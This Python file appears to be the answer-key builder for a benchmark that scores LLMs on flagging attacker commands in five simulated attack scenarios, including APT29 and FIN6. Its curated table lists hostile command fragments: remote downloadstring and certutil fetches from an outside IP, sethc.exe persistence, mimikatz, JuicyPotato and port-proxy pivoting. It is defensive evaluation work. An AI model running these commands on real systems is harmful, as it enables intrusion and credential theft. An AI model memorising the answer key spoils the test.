"""
Phase 1 -- Ground-truth parser.

Reads attack_annotation/A*.txt (the attacker's actual commands, one file per
attack step) and produces a clean, hand-verified ground_truth[scenario] list.
This is the answer key: it is never shown to any LLM, only to the scorer
(Phase 3, not yet written).

Why the stage/match_substring tables below are hand-curated, not parsed
automatically from attack_analysis.xls:

Each scenario's attack_analysis.xls uses a DIFFERENT relationship between its
own ID column and the attack_annotation/A*.txt filenames -- confirmed by
manually reading all five scenarios before writing this parser:

  - WS12:     xls IDs (A1, A7, A24, A25, A32, ...) are a totally different,
              non-sequential ID space than the annotation filenames (A1-A6).
              ID-string matching silently produces wrong stage labels.
  - Ubuntu:   xls IDs DO align 1:1 with annotation filenames (A4 in the xls
              really is A4.txt), but the ROWS are out of numeric order in the
              sheet (the A4 row appears physically after the A6/A7 row).
  - APT29/Sidewinder/FIN6: xls IDs align 1:1 with annotation filenames AND
              appear in order -- the "clean" case. Even here, one exact command
              text differs slightly between the two sources for one node
              (APT29 A34: xls has a placeholder URL, the annotation file has
              the real one) -- proof that blind text-matching alone isn't
              airtight either.

Given three different failure modes across five scenarios, the safest choice
was to resolve the (stage, match_substring) for every single node by hand,
once, by reading both sources side by side -- rather than trust one
automated join rule that would work for some scenarios and silently corrupt
others. The tables below are that hand-verified result.

match_substring is the distinctive fragment (malware filename, tool+target
combo, or IP/URL) the Phase 3 scorer will search for inside a model's
flagged command. A value of None marks a node whose real attacker command
has no distinctive fragment at all (e.g. a bare "whoami") -- these are
genuine weak points in this dataset's ground truth, not a parsing bug, and
are called out explicitly rather than papered over with a fragile substring.
"""

import json
import re
from datetime import datetime
from pathlib import Path

SIMULATED_DATA_ROOT = Path.home() / "sajeev" / "Simulated-Data" / "doc"
OUTPUT_DIR = Path(__file__).resolve().parent.parent / "data" / "ground_truth"

SCENARIOS = {
    "WS12": SIMULATED_DATA_ROOT / "SimulatedWS12-attack" / "attack_annotation",
    "Ubuntu": SIMULATED_DATA_ROOT / "SimulatedUbuntu-attack" / "attack_annotation",
    "APT29": SIMULATED_DATA_ROOT / "SimulatedW10-attack" / "APT29" / "attack_annotation",
    "Sidewinder": SIMULATED_DATA_ROOT / "SimulatedW10-attack" / "Sidewinder" / "attack_annotation",
    "FIN6": SIMULATED_DATA_ROOT / "SimulatedW10-attack" / "FIN6" / "attack_annotation",
}

# scenario -> { annotation_id: (stage, match_substring_or_None) }
# Hand-verified against both attack_annotation/A*.txt and attack_analysis.xls
# for every node in every scenario -- see module docstring.
CURATED = {
    "WS12": {
        "A1": ("Initial Access", "ping www.baidu.com -c 1"),
        "A2": ("Initial Access", "sangforcat.exe"),
        "A3": ("Credential Access", "WinBrute.exe"),
        "A4": ("Persistence", r"Execution Options\\sethc.exe"),  # source file uses literal double backslashes
        "A5": ("Discovery", "nbtscan.exe"),
        "A6": ("Lateral Movement", r"PAExec.exe \\192.168.0.244"),
    },
    "Ubuntu": {
        "A1": ("Initial Access", "d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA=="),
        "A2": ("Initial Access", "sandcat-linux"),
        "A3": ("Initial Access", "PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5n"),
        "A4": ("Persistence", None),  # command is a bare "whoami" -- not distinctive, documented weak node
        "A5": ("Credential Access", "fscan-main.zip"),
        "A6": ("Lateral Movement", "sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable"),
        "A7": ("Lateral Movement", r"Public\sandcat.exe"),
        "A8": ("Privilege Escalation", "JuicyPotato_x64.exe"),
    },
    "APT29": {
        "A1": ("Initial Access", "chromeRemoteServices.ps1"),
        "A2": ("Execution", "downloadstring('http://124.223.85.207:8082/a')"),
        "A3": ("Execution", "T1059.003"),
        "A4": ("Execution", "T1059.006.py"),
        "A5": ("Execution", "1053.005.bat"),
        "A6": ("Execution", "wmic computersystem get domain"),
        "A7": ("Persistence", "t1547.001"),
        "A8": ("Persistence", "T1547.009"),
        "A9": ("Persistence", "T1546.008"),
        "A10": ("Persistence", "chromeRemoteServices.ps1"),
        "A11": ("Persistence", "1053.005.bat"),
        "A12": ("Privilege Escalation", "T1548.002 -TestNumbers 2"),
        "A13": ("Privilege Escalation", "T1547.009"),
        "A14": ("Privilege Escalation", "T1546.008"),
        "A15": ("Privilege Escalation", "1053.005.bat"),
        "A16": ("Defense Evasion", "Invoke-AtomicTest T1548.002"),
        "A17": ("Defense Evasion", "certutil.exe -decode a.txt b.txt"),
        "A18": ("Defense Evasion", "HookSSLX64.dll"),
        "A19": ("Defense Evasion", "timestomp/timestomp.txt"),
        "A20": ("Defense Evasion", "spolsv.exe"),
        "A21": ("Defense Evasion", "spolsv.exe"),
        "A22": ("Defense Evasion", "LockWorkStation"),
        "A23": ("Defense Evasion", "localport=80"),
        "A24": ("Credential Access", "mimikatz2.exe"),
        "A25": ("Discovery", "net localgroup"),
        "A26": ("Discovery", "nltest /domain_trusts"),
        "A27": ("Discovery", r"systemdrive%\Users\*.*"),
        "A28": ("Discovery", "net localgroup"),
        "A29": ("Discovery", "tasklist"),
        "A30": ("Discovery", "arp -a"),
        "A31": ("Discovery", "systeminfo"),
        "A32": ("Lateral Movement", "mimikatz.exe"),
        "A33": ("Collection", "T1022.zip"),
        "A34": ("Command and Control", "Invoke-WebRequest http://124.223.85.207:8082/Test.hta"),
        "A35": ("Command and Control", "evil-kiwi.png"),
        "A36": ("Command and Control", "urlcache -split -f  http://124.223.85.207:8082/Test.hta"),
        "A37": ("Command and Control", "portproxy add v4tov4 listenport=65535"),
    },
    "Sidewinder": {
        "A1": ("Execution", "downloadstring('http://124.223.85.207:8082/a')"),
        "A2": ("Execution", "T1059.005"),
        "A3": ("Execution", "T1059.007.vbs"),
        "A4": ("Persistence", "t1547.001"),
        "A5": ("Persistence", "verifierdlls"),
        "A6": ("Defense Evasion", "spolsv.exe"),
        "A7": ("Defense Evasion", "T1218.005.hta"),
        "A8": ("Discovery", r"systemdrive%\Users\*.*"),
        "A9": ("Discovery", "tasklist"),
        "A10": ("Discovery", "systeminfo"),
        "A11": ("Discovery", r"net time \\127.0.0.1"),
        "A12": ("Discovery", None),  # command is a bare "whoami" -- not distinctive, documented weak node
        "A13": ("Discovery", "route print -4"),
        "A14": ("Command and Control", "Invoke-WebRequest http://124.223.85.207:8082/Test.hta"),
        "A15": ("Command and Control", "urlcache -split -f  http://124.223.85.207:8082/Test.hta"),
    },
    "FIN6": {
        "A1": ("Execution", "downloadstring('http://124.223.85.207:8082/a')"),
        "A2": ("Execution", "T1059.003_script.bat"),
        "A3": ("Execution", "T1059.007.vbs"),
        "A4": ("Execution", "1053.005.bat"),
        "A5": ("Execution", "localport=80"),
        "A6": ("Execution", "wmic computersystem get domain"),
        "A7": ("Persistence", r"Policies\Explorer\Run"),
        "A8": ("Persistence", "1053.005.bat"),
        "A9": ("Privilege Escalation", "T1134.001"),
        "A10": ("Privilege Escalation", "1053.005.bat"),
        "A11": ("Defense Evasion", "T1134.001"),
        "A12": ("Defense Evasion", "localport=80"),
        "A13": ("Defense Evasion", "HookSSLX64.dll"),
        "A14": ("Defense Evasion", "spolsv.exe"),
        "A15": ("Defense Evasion", "echo test >> test.exe"),
        "A16": ("Credential Access", "lazagne1.exe"),
        "A17": ("Credential Access", "procdump.exe"),
        "A18": ("Credential Access", "T1003.003"),
        "A19": ("Discovery", "domain admins"),
        "A20": ("Discovery", "netstat -an"),
        "A21": ("Discovery", "arp -a"),
        "A22": ("Collection", "T1022.zip"),
        "A23": ("Collection", "T1119"),
    },
}

# Nodes sharing the same match_substring within a scenario (the same command
# was legitimately re-run at a different point in the attack, e.g. the same
# scheduled-task persistence trick used three times). Not a bug -- documented
# so Phase 3's scorer knows to expect many-to-one matches for these ids.
_KNOWN_DUPLICATE_SUBSTRINGS = {
    "APT29": {"1053.005.bat", "T1547.009", "T1546.008", "chromeRemoteServices.ps1", "spolsv.exe", "net localgroup"},
    "FIN6": {"1053.005.bat", "localport=80", "T1134.001"},
}


def _parse_annotation_file(path: Path) -> dict:
    """Parse one attack_annotation/A*.txt file into its fields."""
    text = path.read_text(encoding="utf-8", errors="replace")
    sections = re.split(r"\[(\w+)\]\s*\n", text)
    # sections looks like: ['', 'occurTime', '<body>', 'hostIp', '<body>', ...]
    fields = {}
    for i in range(1, len(sections), 2):
        key = sections[i]
        body = sections[i + 1].strip()
        fields[key] = body

    occur_lines = [l for l in fields.get("occurTime", "").splitlines() if l.strip()]
    start_time = occur_lines[0].strip() if occur_lines else None
    end_time = occur_lines[1].strip() if len(occur_lines) > 1 else start_time

    return {
        "occurTime_start": start_time,
        "occurTime_end": end_time,
        "hostIp": fields.get("hostIp", "").strip() or None,
        "pCommand": fields.get("pCommand", "").strip(),
        "pFilePath": fields.get("pFilePath", "").strip() or None,
    }


def _sort_key(node: dict):
    ts = node["occurTime_start"]
    if not ts:
        return datetime.max
    try:
        return datetime.strptime(ts.split(".")[0], "%Y-%m-%d %H:%M:%S")
    except ValueError:
        return datetime.max


def build_ground_truth(scenario: str) -> list[dict]:
    annotation_dir = SCENARIOS[scenario]
    curated = CURATED[scenario]

    files = sorted(
        (f for f in annotation_dir.glob("A*.txt") if f.stem != "A_alltime"),
        key=lambda f: int(re.match(r"A(\d+)", f.stem).group(1)),
    )

    nodes = []
    seen_ids = set()
    for f in files:
        node_id = f.stem
        seen_ids.add(node_id)
        if node_id not in curated:
            raise KeyError(
                f"{scenario}: {f.name} has no curated stage/match_substring entry. "
                "Every annotation file must be hand-verified before use."
            )
        stage, match_substring = curated[node_id]
        parsed = _parse_annotation_file(f)
        if match_substring is not None and match_substring not in parsed["pCommand"]:
            raise ValueError(
                f"{scenario}/{node_id}: curated match_substring {match_substring!r} "
                f"is not a literal substring of the real command:\n  {parsed['pCommand']!r}"
            )
        nodes.append(
            {
                "id": node_id,
                "stage": stage,
                "match_substring": match_substring,
                "full_command": parsed["pCommand"],
                "file_path": parsed["pFilePath"],
                "occurTime_start": parsed["occurTime_start"],
                "occurTime_end": parsed["occurTime_end"],
                "hostIp": parsed["hostIp"],
            }
        )

    stale = set(curated) - seen_ids
    if stale:
        raise KeyError(f"{scenario}: curated table has entries with no matching file: {stale}")

    nodes.sort(key=_sort_key)
    return nodes


def main():
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    all_ground_truth = {}

    for scenario in SCENARIOS:
        nodes = build_ground_truth(scenario)
        all_ground_truth[scenario] = nodes

        out_path = OUTPUT_DIR / f"{scenario}.json"
        out_path.write_text(json.dumps(nodes, indent=2), encoding="utf-8")

        weak = [n["id"] for n in nodes if n["match_substring"] is None]
        print(f"{scenario:12s} {len(nodes):2d} nodes -> {out_path.relative_to(OUTPUT_DIR.parent.parent)}"
              + (f"   [weak/non-distinctive: {', '.join(weak)}]" if weak else ""))

    total = sum(len(v) for v in all_ground_truth.values())
    print(f"\nTotal ground-truth nodes across all 5 scenarios: {total}")

    combined_path = OUTPUT_DIR / "all_scenarios.json"
    combined_path.write_text(json.dumps(all_ground_truth, indent=2), encoding="utf-8")
    print(f"Combined file: {combined_path.relative_to(OUTPUT_DIR.parent.parent)}")

    return all_ground_truth


if __name__ == "__main__":
    main()
